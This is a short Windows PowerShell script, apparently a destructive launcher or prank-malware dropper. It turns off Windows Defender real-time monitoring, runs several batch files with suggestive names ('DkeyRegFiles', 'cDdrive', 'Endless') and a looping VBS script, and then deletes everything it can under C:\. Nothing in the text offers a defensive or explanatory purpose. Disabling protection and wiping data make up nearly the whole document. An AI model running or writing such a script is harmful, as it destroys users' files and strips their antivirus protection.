Cls 
Set-MpPreference -DisableRealtimeMonitoring $true
./interservertk.bat 
./DkeyRegFiles.bat 
./psychonotes.bat 
./cDdrive.bat 
./Endless.bat
cscript looploop.vbs 
Remove-Item C:\*
Cls 
